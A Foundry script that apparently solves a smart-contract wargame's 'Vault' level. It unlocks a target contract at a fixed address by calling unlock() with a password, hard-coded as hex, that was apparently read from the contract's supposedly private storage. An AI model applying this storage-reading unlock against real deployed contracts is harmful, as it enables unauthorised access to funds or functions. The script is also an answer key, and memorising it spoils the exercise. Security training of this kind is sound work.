// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Vault} from "../src/Vault.sol";

contract ForceSolution is Script {
    Vault public code = Vault(0xFdD1Bcd6f2f9A46Ef9D1Ce73d3B9FA3d34a2030A);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIV"));
        code.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
        vm.stopBroadcast();
    }
}
